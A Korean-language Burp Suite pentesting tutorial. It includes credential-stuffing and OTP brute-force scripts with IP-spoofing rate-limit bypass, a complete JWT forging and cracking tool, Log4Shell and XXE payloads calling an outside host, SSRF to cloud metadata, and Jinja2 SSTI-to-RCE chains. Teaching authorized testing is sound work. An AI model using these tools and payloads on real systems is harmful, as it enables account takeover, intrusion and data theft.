# Burp Suite 실전 완전 정복

## Burp Suite 아키텍처 이해

```
브라우저 ──► Proxy (8080) ──► Target 서버
              │
        Burp Suite
        ├── Proxy      ← HTTP 인터셉트/수정
        ├── Scanner    ← 자동 취약점 탐지 (Pro)
        ├── Intruder   ← 자동화 공격
        ├── Repeater   ← 수동 요청 반복
        ├── Decoder    ← 인코딩/디코딩
        ├── Comparer   ← 응답 비교
        ├── Logger     ← 전체 트래픽 로그
        └── Extender   ← 플러그인 관리
```

---

## 1. Proxy 고급 설정

### 인터셉트 필터 규칙

```
Proxy → Intercept → And URL Is In Target Scope
→ 범위 밖 트래픽은 자동 통과, 범위 내만 인터셉트
```

**Proxy 히스토리 필터링:**
```
Filter: Show only in-scope items
Filter: Show only parameterized requests
Filter: Hide CSS, image, general binary
```

### 매치 & 리플레이스 (자동 헤더 주입)

```
Proxy → Options → Match and Replace
→ Add:
  Type: Request Header
  Match: ^
  Replace: X-Forwarded-For: 127.0.0.1

→ Add:
  Type: Request Header  
  Match: ^
  Replace: X-Custom-IP-Authorization: 127.0.0.1
```

### TLS 패스스루 예외 설정

```
Proxy → Options → TLS Pass Through
→ 핀닝된 앱 도메인 추가 (ex: pinned.example.com)
```

---

## 2. Intruder 완전 정복

### 공격 유형 선택 가이드

| 유형 | 동작 | 사용 시나리오 |
|------|------|--------------|
| **Sniper** | 단일 페이로드 셋, 마커 순차 | 단일 파라미터 퍼징 |
| **Battering Ram** | 동일 페이로드 모든 마커 동시 | username=admin&password=admin |
| **Pitchfork** | 여러 페이로드 셋 병렬 | credential stuffing |
| **Cluster Bomb** | 모든 조합 생성 | 패스워드 브루트포스 |

### Cluster Bomb 자격증명 공격

```
Position 설정:
POST /login HTTP/1.1
...
username=§admin§&password=§password§

Payload set 1: 유저명 리스트
Payload set 2: 패스워드 리스트

Options → Grep - Match:
  "Invalid credentials" → 실패
  "Welcome" → 성공

Options → Attack Results:
  Status code 302 → 성공 판단
```

### Intruder 속도 제한 우회

```
Options → Request Engine:
  Number of threads: 1
  Number of retries: 3
  Pause before retry: 2000ms
  Throttle: 1000ms (요청 간 1초 딜레이)

→ Rate limiting 우회용 헤더 추가:
  X-Forwarded-For: §ip§  (IP 로테이션)
```

### 자동 페이로드 처리 (Payload Processing)

```
Intruder → Payloads → Payload Processing → Add
1. Hash: MD5  (패스워드를 MD5로 해싱 후 전송)
2. Encode: URL encode all characters
3. Add prefix: admin_
4. Add suffix: @company.com
```

---

## 3. Repeater 고급 활용

### 요청 탭 관리

```bash
# 단축키
Ctrl+R    → Repeater로 전송
Ctrl+U    → URL 디코딩
Ctrl+Shift+U → URL 인코딩
Ctrl+H    → HTML 디코딩

# 다중 탭 비교 워크플로
탭1: 정상 요청 (기준선)
탭2: IDOR 테스트 (다른 user_id)
탭3: Auth bypass 시도
```

### GraphQL 테스트

```graphql
# Introspection Query (스키마 추출)
POST /graphql
{
  "query": "{ __schema { types { name fields { name } } } }"
}

# 필드 발견 후 민감 데이터 쿼리
{
  "query": "{ user(id: 2) { email password ssn creditCard } }"
}

# GraphQL 인젝션
{
  "query": "{ user(id: \"1; DROP TABLE users--\") { name } }"
}
```

---

## 4. Burp Scanner (Pro) 핵심 설정

### 스캔 설정 최적화

```
Scanner → Scan Configuration → New:

Crawl:
  Max crawl depth: 10
  Max unique locations: 5000
  Application login: [크리덴셜 설정]

Audit:
  Audit speed: Thorough
  Issues reported: All issues
  
  Issue types (체크):
  ✓ SQL injection
  ✓ XSS (stored, reflected, DOM)
  ✓ OS command injection
  ✓ SSRF
  ✓ XXE
  ✓ Path traversal
  ✓ IDOR (via Scan checks)
  ✓ Open redirect
```

### 활성 스캔 vs 수동 스캔

```
활성 스캔 (Active): 실제 공격 페이로드 전송 → 허가된 환경에서만
수동 스캔 (Passive): 트래픽 분석만 → 항상 안전

수동 스캔만 수행:
Scanner → Scanner → Passive scanning only 체크
```

---

## 5. 핵심 Burp Suite 확장 도구

### Autorize (IDOR 자동 탐지)

```
설치: BApp Store → Autorize

설정:
1. 낮은 권한 계정으로 로그인
2. 쿠키/토큰을 Autorize에 붙여넣기
3. 높은 권한 계정으로 브라우징
4. Autorize가 각 요청을 낮은 권한으로 재전송

결과:
  빨간색 (Bypassed!) → IDOR 취약점 발견
  노란색 (Is enforced?) → 수동 확인 필요
  초록색 (Is enforced!) → 정상적인 권한 제어

필터:
  Filter: Interception filters
  Show only: Bypassed (IDOR만 표시)
```

### Param Miner (숨겨진 파라미터 발견)

```
설치: BApp Store → Param Miner

우클릭 → Extensions → Param Miner → Guess params
→ 자동으로 수천 개 파라미터 이름 시도

발견 예시:
  ?debug=true → 디버그 모드 활성화
  ?admin=1 → 관리자 권한 획득
  ?beta=true → 미공개 기능 접근
  ?internal=true → 내부 API 엔드포인트

Options:
  Guess headers: ON (헤더도 퍼징)
  Guess cookies: ON
  Add FCBZcache buster: ON (캐시 무효화)
```

### Turbo Intruder (고속 요청)

```python
# race_condition.py — Turbo Intruder 스크립트 (Burp Suite 내에서 실행)
#
# 사용법:
#   1. Burp Proxy History에서 대상 요청 우클릭
#   2. Extensions > Turbo Intruder > Send to Turbo Intruder
#   3. 이 스크립트 붙여넣기 → Attack 클릭
#
# gate 기법: 요청들을 큐에 쌓은 뒤 openGate로 동시 해제
# → 서버가 동시 요청을 처리하지 못할 때 레이스 컨디션 발생

def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=50,
        requestsPerConnection=1,
        pipeline=False,
        engine=Engine.THREADED,
    )

    # 100개 요청을 gate 'race1'로 묶어 동시 전송
    for i in range(100):
        engine.queue(target.req, str(i), gate='race1')

    engine.openGate('race1')
    engine.complete(timeout=30)


def handleResponse(req, interesting):
    if req.status == 200:
        table.add(req)
```

```python
# credential_stuffing.py — 대량 크리덴셜 스터핑 (Turbo Intruder)
#
# 요청 템플릿에서 § 마커 위치:
#   username=§user§&password=§pass§
# wordlists: user:pass 형식 파일

def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=5,
        requestsPerConnection=1,
        pipeline=False,
    )

    for cred in open('/tmp/credentials.txt', encoding='utf-8'):
        cred = cred.strip()
        if ':' not in cred:
            continue
        user, password = cred.split(':', 1)
        engine.queue(target.req, [user, password])


def handleResponse(req, interesting):
    # 성공 조건: 302 리다이렉트 또는 "Welcome" 포함
    if req.status == 302 or 'Welcome' in req.response or 'dashboard' in req.response.lower():
        table.add(req)
        print(f'[+] Valid: {req.payloads[0]}:{req.payloads[1]}')
```

### Burp Suite REST API Python 클라이언트

```python
#!/usr/bin/env python3
"""
Burp Suite Professional REST API 클라이언트
요구사항: pip install requests
Burp 설정: Project Options > Misc > Burp Collaborator > 활성화
           User Options > Suite > REST API > 활성화 (포트 1337, 기본)
"""

from __future__ import annotations

import argparse
import json
import sys
import textwrap
import time
from dataclasses import dataclass
from pathlib import Path
from typing import Optional
from urllib.parse import urljoin

import requests


# ── Burp REST API 클라이언트 ──────────────────────────────────────────────────

class BurpClient:
    """Burp Suite Pro REST API 래퍼."""

    def __init__(self, base_url: str = "http://127.0.0.1:1337", api_key: str = "") -> None:
        self.base = base_url.rstrip("/") + "/"
        self.session = requests.Session()
        if api_key:
            self.session.headers["Authorization"] = api_key

    def _get(self, path: str, **kwargs) -> dict:
        resp = self.session.get(urljoin(self.base, path), timeout=30, **kwargs)
        resp.raise_for_status()
        return resp.json() if resp.content else {}

    def _post(self, path: str, data: dict) -> dict:
        resp = self.session.post(urljoin(self.base, path), json=data, timeout=30)
        resp.raise_for_status()
        return resp.json() if resp.content else {}

    # ── 스캔 관리 ────────────────────────────────────────────────────────────

    def start_scan(
        self,
        url: str,
        scan_config: Optional[list[str]] = None,
        credentials: Optional[dict] = None,
    ) -> str:
        """스캔 시작. task_id 반환."""
        payload: dict = {"urls": [url]}
        if scan_config:
            payload["scan_configurations"] = [{"name": c} for c in scan_config]
        if credentials:
            payload["application_logins"] = [credentials]

        data = self._post("v0.1/scan", payload)
        task_id = data.get("task_id", "")
        print(f"[+] 스캔 시작: {url} → task_id={task_id}")
        return task_id

    def get_scan_status(self, task_id: str) -> dict:
        return self._get(f"v0.1/scan/{task_id}")

    def wait_for_scan(self, task_id: str, poll_interval: int = 10) -> dict:
        """스캔 완료까지 폴링."""
        print(f"[*] 스캔 대기 중 (task_id={task_id})...")
        while True:
            status = self.get_scan_status(task_id)
            scan_status = status.get("scan_status", "")
            metrics = status.get("scan_metrics", {})
            progress = metrics.get("crawl_progress", 0)
            audited = metrics.get("audit_progress", 0)

            print(f"    상태: {scan_status} | 크롤: {progress}% | 감사: {audited}%")

            if scan_status in ("succeeded", "failed"):
                return status
            time.sleep(poll_interval)

    def get_issues(self, task_id: str) -> list[dict]:
        """스캔 결과의 취약점 목록 반환."""
        status = self.get_scan_status(task_id)
        return status.get("issue_events", [])

    def cancel_scan(self, task_id: str) -> None:
        self._post(f"v0.1/scan/{task_id}/cancel", {})
        print(f"[+] 스캔 취소: {task_id}")

    # ── 취약점 파싱 ──────────────────────────────────────────────────────────

    def parse_issues(self, issues: list[dict]) -> list[dict]:
        """issue_events를 간결한 취약점 목록으로 변환."""
        parsed: list[dict] = []
        for event in issues:
            issue = event.get("issue", {})
            if not issue:
                continue
            parsed.append({
                "type": issue.get("type_name", "Unknown"),
                "severity": issue.get("severity", "information"),
                "confidence": issue.get("confidence", "firm"),
                "url": issue.get("origin", ""),
                "path": issue.get("path", ""),
                "serial": issue.get("serial_number", ""),
                "description": issue.get("description", "")[:200],
            })
        # 심각도 순 정렬
        order = {"high": 0, "medium": 1, "low": 2, "information": 3}
        return sorted(parsed, key=lambda i: order.get(i["severity"].lower(), 99))


# ── 보고서 저장 ───────────────────────────────────────────────────────────────

def save_issues(issues: list[dict], out_path: Path) -> None:
    out_path.write_text(
        json.dumps(issues, ensure_ascii=False, indent=2), encoding="utf-8"
    )
    print(f"[+] 취약점 저장: {out_path} ({len(issues)}개)")


def print_summary(issues: list[dict]) -> None:
    from collections import Counter
    counts = Counter(i["severity"].lower() for i in issues)
    print(f"\n{'='*50}")
    print(f"  HIGH   : {counts.get('high', 0)}")
    print(f"  MEDIUM : {counts.get('medium', 0)}")
    print(f"  LOW    : {counts.get('low', 0)}")
    print(f"  INFO   : {counts.get('information', 0)}")
    print(f"  합계   : {len(issues)}")
    print(f"{'='*50}\n")

    for issue in issues:
        sev = issue["severity"].upper()[:4]
        print(f"  [{sev}] {issue['type']:<40} {issue['url']}{issue['path']}")


# ── CLI ───────────────────────────────────────────────────────────────────────

def main() -> None:
    parser = argparse.ArgumentParser(
        description="Burp Suite REST API Python 클라이언트",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent(
            """
            사전 요건:
              Burp Suite Pro → User Options → REST API → 활성화 (포트 1337)

            사용 예시:
              # 스캔 시작 + 완료 대기 + 결과 저장
              python burp_client.py scan -u https://target.com -o issues.json

              # 기존 스캔 결과 조회
              python burp_client.py issues --task-id abc123 -o issues.json

              # 스캔 취소
              python burp_client.py cancel --task-id abc123
            """
        ),
    )
    parser.add_argument("--burp-url", default="http://127.0.0.1:1337", help="Burp REST API URL")
    parser.add_argument("--api-key", default="", help="Burp API 키")

    sub = parser.add_subparsers(dest="cmd", required=True)

    p_scan = sub.add_parser("scan", help="스캔 시작 및 결과 수집")
    p_scan.add_argument("-u", "--url", required=True)
    p_scan.add_argument("--config", nargs="*", help="스캔 구성 이름")
    p_scan.add_argument("--username")
    p_scan.add_argument("--password")
    p_scan.add_argument("--wait", action="store_true", default=True)
    p_scan.add_argument("-o", "--output", type=Path, default=None)

    p_issues = sub.add_parser("issues", help="스캔 결과 조회")
    p_issues.add_argument("--task-id", required=True)
    p_issues.add_argument("-o", "--output", type=Path, default=None)

    p_cancel = sub.add_parser("cancel", help="스캔 취소")
    p_cancel.add_argument("--task-id", required=True)

    args = parser.parse_args()

    client = BurpClient(args.burp_url, args.api_key)

    try:
        if args.cmd == "scan":
            creds = None
            if args.username and args.password:
                creds = {"username": args.username, "password": args.password}
            task_id = client.start_scan(args.url, scan_config=args.config, credentials=creds)

            if args.wait:
                client.wait_for_scan(task_id)
                raw_issues = client.get_issues(task_id)
                issues = client.parse_issues(raw_issues)
                print_summary(issues)
                if args.output:
                    save_issues(issues, args.output)

        elif args.cmd == "issues":
            raw_issues = client.get_issues(args.task_id)
            issues = client.parse_issues(raw_issues)
            print_summary(issues)
            if args.output:
                save_issues(issues, args.output)

        elif args.cmd == "cancel":
            client.cancel_scan(args.task_id)

    except requests.ConnectionError:
        sys.exit(
            f"[-] Burp Suite에 연결할 수 없습니다 ({args.burp_url})\n"
            "    User Options → REST API → Enable 확인"
        )
    except requests.HTTPError as exc:
        sys.exit(f"[-] API 오류: {exc}")


if __name__ == "__main__":
    main()
```

### Logger++ (고급 로깅)

```
설치: BApp Store → Logger++

기능:
  - 모든 HTTP 요청/응답 저장
  - 고급 필터 (Grep 패턴 매칭)
  - 자동 저장 (세션 종료 후에도 유지)
  - 응답 시간 측정 (Time-based SQLi 탐지)

필터 예시:
  Response.Body CONTAINS "error"
  Response.Body CONTAINS "SQL"
  Response.Time > 5000  (5초 이상 지연 → Time-based SQLi)
```

### Active Scan++ (확장 스캔)

```
설치: BApp Store → ActiveScan++

추가 탐지 항목:
  - SSRF via Collaborator
  - Blind XSS (XSS Hunter 통합)
  - JWT 취약점
  - XXE via file upload
  - Cache poisoning
  - HTTP request smuggling (기본 탐지)
```

---

## 6. Burp Collaborator 활용 (OOB 취약점)

### Collaborator 서버 설정

```
Burp → Project Options → Misc → Burp Collaborator Server:
  Use the default Collaborator server (Burp Cloud)
  OR
  Use a private Collaborator server: your-collab.com
```

### DNS/HTTP 콜백을 이용한 Blind 취약점 탐지

```bash
# SSRF 테스트
GET /fetch?url=http://burpcollaborator.net/ssrf-test

# Blind XSS 테스트  
"><script src="//burpcollaborator.net/xss"></script>

# XXE OOB 탐지
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://burpcollaborator.net/xxe">
]>
<data>&xxe;</data>

# Log4Shell 탐지
${jndi:ldap://burpcollaborator.net/log4shell}
```

### SSRF to Internal Network

```bash
# Burp Collaborator로 SSRF 확인 후 내부 IP 스캔
GET /proxy?url=http://192.168.1.1/  → 내부 라우터
GET /proxy?url=http://169.254.169.254/latest/meta-data/  → AWS 메타데이터
GET /proxy?url=http://10.0.0.1:8080/  → 내부 서비스

# 응답으로 내부 네트워크 매핑
for ip in 192.168.1.{1..254}:
    GET /proxy?url=http://{ip}/
```

---

## 7. JWT 공격 실습

### JWT 구조 분석

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4ifQ.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

헤더.페이로드.서명

헤더: {"alg":"HS256","typ":"JWT"}
페이로드: {"sub":"1234","name":"John","role":"user"}
서명: HMAC-SHA256(헤더+페이로드, 비밀키)
```

### JWT 공격 기법

```python
#!/usr/bin/env python3
"""
JWT 취약점 분석 및 공격 CLI
요구사항: pip install pyjwt cryptography requests
"""

from __future__ import annotations

import argparse
import base64
import json
import sys
import textwrap
from pathlib import Path
from typing import Any, Optional

try:
    import jwt as pyjwt
except ImportError:
    sys.exit("[-] pip install pyjwt cryptography")


# ── JWT 파서 ──────────────────────────────────────────────────────────────────

def decode_jwt_insecure(token: str) -> tuple[dict, dict]:
    """서명 검증 없이 JWT 헤더·페이로드 디코딩."""
    parts = token.split(".")
    if len(parts) < 2:
        raise ValueError("JWT 형식 오류 (점으로 구분된 3부분 필요)")

    def _b64_decode(data: str) -> dict:
        padding = 4 - len(data) % 4
        data += "=" * (padding % 4)
        return json.loads(base64.urlsafe_b64decode(data))

    return _b64_decode(parts[0]), _b64_decode(parts[1])


# ── alg:none 공격 ─────────────────────────────────────────────────────────────

def attack_alg_none(token: str, payload_override: Optional[dict] = None) -> str:
    """alg:none 공격 — 서명 없는 JWT 생성."""
    _, payload = decode_jwt_insecure(token)

    if payload_override:
        payload.update(payload_override)

    new_header = {"alg": "none", "typ": "JWT"}

    def _b64_encode(data: dict) -> str:
        return base64.urlsafe_b64encode(
            json.dumps(data, separators=(",", ":")).encode()
        ).rstrip(b"=").decode()

    return f"{_b64_encode(new_header)}.{_b64_encode(payload)}."


# ── RS256 → HS256 알고리즘 혼동 공격 ─────────────────────────────────────────

def attack_alg_confusion(token: str, public_key_path: Path,
                          payload_override: Optional[dict] = None) -> str:
    """RS256→HS256 알고리즘 혼동: 서버 RSA 공개키로 HMAC 서명."""
    _, payload = decode_jwt_insecure(token)
    if payload_override:
        payload.update(payload_override)

    public_key_pem = public_key_path.read_text()
    forged = pyjwt.encode(payload, public_key_pem, algorithm="HS256")
    return forged if isinstance(forged, str) else forged.decode()


# ── 약한 비밀키 크래킹 ────────────────────────────────────────────────────────

def crack_secret(token: str, wordlist_path: Path, max_attempts: int = 100_000) -> Optional[str]:
    """HMAC 기반 JWT의 비밀키를 wordlist에서 찾기."""
    _, payload = decode_jwt_insecure(token)
    alg = decode_jwt_insecure(token)[0].get("alg", "HS256")

    if not alg.startswith("HS"):
        print(f"[!] 알고리즘 {alg}은 HMAC이 아닙니다.")
        return None

    print(f"[*] 비밀키 크래킹 시작 (최대 {max_attempts:,}개)...")
    tried = 0
    with open(wordlist_path, encoding="utf-8", errors="ignore") as f:
        for line in f:
            if tried >= max_attempts:
                break
            secret = line.strip()
            if not secret:
                continue
            tried += 1
            try:
                pyjwt.decode(token, secret, algorithms=[alg])
                print(f"\n[+] 비밀키 발견: {secret!r} ({tried:,}번째)")
                return secret
            except pyjwt.InvalidSignatureError:
                continue
            except pyjwt.DecodeError:
                continue
            except Exception:
                continue

            if tried % 10000 == 0:
                print(f"    {tried:,}개 시도...", end="\r")

    print(f"\n[-] {tried:,}개 시도 후 비밀키 미발견")
    return None


# ── JWT 변조 ─────────────────────────────────────────────────────────────────

def forge_with_secret(token: str, secret: str, payload_override: dict) -> str:
    """알려진 비밀키로 페이로드를 변조한 새 JWT 생성."""
    header, payload = decode_jwt_insecure(token)
    alg = header.get("alg", "HS256")
    payload.update(payload_override)
    forged = pyjwt.encode(payload, secret, algorithm=alg, headers=header)
    return forged if isinstance(forged, str) else forged.decode()


# ── CLI ───────────────────────────────────────────────────────────────────────

def main() -> None:
    parser = argparse.ArgumentParser(
        description="JWT 취약점 분석 및 공격 도구",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent(
            """
            사용 예시:
              # JWT 디코딩
              python jwt_attack.py decode eyJhbGci...

              # alg:none 공격 (role을 admin으로 변조)
              python jwt_attack.py none eyJhbGci... --set role=admin

              # RS256→HS256 알고리즘 혼동
              python jwt_attack.py confusion eyJhbGci... --key public.pem --set role=admin

              # 비밀키 크래킹
              python jwt_attack.py crack eyJhbGci... --wordlist rockyou.txt

              # 알려진 비밀키로 페이로드 변조
              python jwt_attack.py forge eyJhbGci... --secret mysecret --set sub=admin
            """
        ),
    )
    sub = parser.add_subparsers(dest="cmd", required=True)

    # decode
    p_dec = sub.add_parser("decode", help="JWT 디코딩 (서명 미검증)")
    p_dec.add_argument("token")

    # none
    p_none = sub.add_parser("none", help="alg:none 공격")
    p_none.add_argument("token")
    p_none.add_argument("--set", nargs="*", metavar="KEY=VALUE",
                        help="페이로드 변조 (예: role=admin)")

    # confusion
    p_conf = sub.add_parser("confusion", help="RS256→HS256 알고리즘 혼동")
    p_conf.add_argument("token")
    p_conf.add_argument("--key", type=Path, required=True, help="RSA 공개키 PEM 파일")
    p_conf.add_argument("--set", nargs="*", metavar="KEY=VALUE")

    # crack
    p_crack = sub.add_parser("crack", help="HMAC 비밀키 크래킹")
    p_crack.add_argument("token")
    p_crack.add_argument("--wordlist", type=Path, required=True)
    p_crack.add_argument("--max", type=int, default=100_000)

    # forge
    p_forge = sub.add_parser("forge", help="알려진 비밀키로 변조")
    p_forge.add_argument("token")
    p_forge.add_argument("--secret", required=True)
    p_forge.add_argument("--set", nargs="*", metavar="KEY=VALUE", required=True)

    args = parser.parse_args()

    def parse_overrides(pairs: list[str] | None) -> dict:
        if not pairs:
            return {}
        result: dict[str, Any] = {}
        for p in pairs:
            k, _, v = p.partition("=")
            try:
                result[k] = json.loads(v)
            except json.JSONDecodeError:
                result[k] = v
        return result

    if args.cmd == "decode":
        header, payload = decode_jwt_insecure(args.token)
        print("Header:")
        print(json.dumps(header, indent=2, ensure_ascii=False))
        print("Payload:")
        print(json.dumps(payload, indent=2, ensure_ascii=False))

    elif args.cmd == "none":
        overrides = parse_overrides(args.set)
        forged = attack_alg_none(args.token, overrides)
        print(f"[+] alg:none 토큰:\n{forged}")

    elif args.cmd == "confusion":
        overrides = parse_overrides(args.set)
        forged = attack_alg_confusion(args.token, args.key, overrides)
        print(f"[+] HS256 혼동 토큰:\n{forged}")

    elif args.cmd == "crack":
        secret = crack_secret(args.token, args.wordlist, args.max)
        if secret:
            print(f"\n[+] 비밀키: {secret}")
            print("    위조 예: python jwt_attack.py forge <token> "
                  f"--secret '{secret}' --set role=admin")

    elif args.cmd == "forge":
        overrides = parse_overrides(args.set)
        forged = forge_with_secret(args.token, args.secret, overrides)
        print(f"[+] 변조된 토큰:\n{forged}")


if __name__ == "__main__":
    main()
```

---

## 8. HTTP Request Smuggling

### CL.TE 스머글링 (Content-Length + Transfer-Encoding)

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### TE.CL 스머글링

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

### Burp로 스머글링 탐지

```
HTTP Request Smuggler 확장 설치
우클릭 → Extensions → HTTP Request Smuggler → Smuggle probe

자동으로 CL.TE, TE.CL, TE.TE 테스트
```

---

## 9. WebSocket 테스트

```
Proxy → WebSockets history → 모든 WS 메시지 캡처

인터셉트 활성화:
Proxy → Options → Intercept WebSockets messages

Repeater로 전송:
우클릭 → Send to Repeater

WebSocket 메시지 변조:
{"action":"getUser","id":"1"} → {"action":"getUser","id":"2"}
```

---

## 10. 실전 버그 발견 체크리스트

```
□ 모든 파라미터에 XSS 페이로드: <script>alert(1)</script>
□ 숫자형 파라미터 IDOR: id=1 → id=2, id=0, id=-1
□ 파일 업로드: .php, .jsp, .aspx 확장자 시도
□ 리다이렉트 파라미터: redirect=javascript:alert(1)
□ Host 헤더 변조: Host: evil.com (캐시 포이즈닝)
□ X-Forwarded-Host: evil.com (비밀번호 리셋 링크 변조)
□ Content-Type 변경: JSON → XML → XXE 시도
□ HTTP 메서드: GET→POST, POST→PUT, 임의 메서드
□ API 버전: /v1/ → /v2/, /api/v1/ → /api/
□ 경로 순회: ../../../etc/passwd
□ SQLi: ', ", 1=1--, SLEEP(5)
□ SSTI: {{7*7}}, ${7*7}, <%= 7*7 %>
□ NoSQLi: {"$gt": ""}, {"$where": "sleep(5000)"}
□ LDAP Injection: *)(|(uid=*
□ XXE: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
□ Deserialization: Java/PHP 직렬화 데이터에 악성 객체 삽입
□ Clickjacking: X-Frame-Options 헤더 미설정 확인
□ CORS: Origin: evil.com → Access-Control-Allow-Origin 반응 확인
```

---

## 11-2. Burp Suite로 Open Redirect 탐지

### Open Redirect 개요 및 탐지
```
Open Redirect:
  서버가 사용자 제공 URL로 리다이렉트 시
  공격자가 피싱 사이트로 유도 가능

취약한 패턴:
  /redirect?url=https://attacker.com
  /login?next=https://attacker.com
  /logout?returnTo=//attacker.com  (프로토콜 상대 URL)
  /go?link=javascript:alert(1)     (XSS 연계)
```

```bash
# Open Redirect 탐지 페이로드
https://target.com/redirect?url=https://evil.com
https://target.com/redirect?url=//evil.com         (프로토콜 생략)
https://target.com/redirect?url=https:evil.com
https://target.com/redirect?url=\evil.com          (백슬래시)
https://target.com/redirect?url=https://target.com@evil.com  (@ 오파싱)
https://target.com/redirect?url=https://evil.com%2F%2Ftarget.com

# Burp Intruder + 페이로드 목록으로 자동화
# redirect 관련 파라미터: url, next, returnTo, go, link, redirect, redir, r, ret

# gau + Open Redirect 파이프라인
gau target.com | grep -E "redirect|next|url|returnTo|go=" | \
  while read url; do
    curl -I -L "$url" 2>/dev/null | grep "Location:" | grep -v "target.com"
  done
```

### Rate Limiting 취약점 탐지
```
Rate Limiting 미적용 시 가능한 공격:
  - 로그인 브루트포스
  - OTP/인증 코드 브루트포스
  - API 대량 요청 (크레딧 소진, 서비스 남용)

탐지 방법:
  Burp Suite Intruder → 동일 요청 100회 반복
  → 응답 코드가 계속 200이면 Rate Limiting 없음
  → 429 Too Many Requests: Rate Limiting 적용됨
  → X-RateLimit-Limit, X-RateLimit-Remaining 헤더 확인

우회 기법:
  - X-Forwarded-For: 1.2.3.4 (매 요청마다 변경)
  - X-Real-IP: 1.2.3.4
  - X-Originating-IP: 1.2.3.4
  → 서버가 이 헤더를 신뢰하면 IP Rate Limit 우회 가능
```

```python
# Turbo Intruder로 Rate Limit 우회 테스트
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=10,
                           requestsPerConnection=1)
    
    for i, otp in enumerate(range(100000, 999999)):
        # X-Forwarded-For 매 요청마다 변경
        req = target.req.replace('X-Forwarded-For: 1.1.1.1', 
                                  f'X-Forwarded-For: 192.168.{i//255}.{i%255}')
        engine.queue(req, str(otp).zfill(6))

def handleResponse(req, interesting):
    if 'invalid' not in req.response.lower():
        table.add(req)
```

---

## 12. SSTI (Server-Side Template Injection) 탐지

### 템플릿 엔진별 탐지 페이로드
```
탐지 순서: 모든 사용자 입력 파라미터에 수학 표현식 삽입
→ 서버가 계산 결과를 반환하면 SSTI 취약점 존재

Jinja2 (Python/Flask):
  {{7*7}}          → 49  (기본 탐지)
  {{7*'7'}}        → 7777777  (Jinja2 특징적 결과)
  {{config}}       → 앱 설정 노출
  {{request.environ}}  → 환경변수
  
Twig (PHP):
  {{7*7}}          → 49
  {{7*'7'}}        → 49 (PHP 특징 — 문자열 자동 숫자 변환)

FreeMarker (Java):
  ${7*7}           → 49
  <#assign>        → 변수 할당
  
Velocity (Java):
  #set($x=7*7)${x} → 49
  
ERB (Ruby):
  <%= 7*7 %>       → 49
  
Smarty (PHP):
  {7*7}            → 49
  {php}system('id'){/php}  → RCE (Smarty2)
  
Mako (Python):
  ${7*7}           → 49
  <%! import os %>
```

### SSTI → RCE 익스플로잇 (Jinja2)
```python
# Jinja2 RCE — Python 내장 함수 체인
{{''.__class__.__mro__[1].__subclasses__()}}
# → Python의 모든 클래스 목록 출력

# subprocess.Popen 찾아서 실행
{{''.__class__.__mro__[1].__subclasses__()[x]('id',shell=True,stdout=-1).communicate()}}

# 간단한 RCE (필터링 없을 때)
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# request 객체 악용
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

### Burp Suite로 SSTI 탐지 자동화
```
1. Intruder → Sniper 모드
2. 모든 파라미터에 § 마킹
3. 페이로드: {{7*7}}, ${7*7}, #{7*7}, *{7*7}, <%= 7*7 %>
4. Grep Match: "49" 응답 필터링
5. 매칭된 파라미터 → Repeater에서 심화 분석

Param Miner와 연계:
- Param Miner가 발견한 숨겨진 파라미터에도 SSTI 시도
- 특히 template, view, page, render 같은 이름의 파라미터 우선
```

---

## 11. Burp Suite 성능 최적화

```
Project Options → Connections:
  Hostname resolution: Use platform default
  Timeouts: 10s (줄이기)
  Retry on failure: OFF (속도)

User Options → Performance:
  Java heap: 2048MB 이상 (jvm_args -Xmx2g)
  
  실행 시:
  java -jar -Xmx2g burpsuite_pro.jar
```

```bash
# Burp 시작 스크립트
#!/bin/bash
BURP_PATH="/opt/BurpSuitePro/burpsuite_pro.jar"
java \
  -jar $BURP_PATH \
  -Xmx2g \
  -Djava.awt.headless=false \
  --unpause-spider-and-scanner \
  2>/dev/null &
```
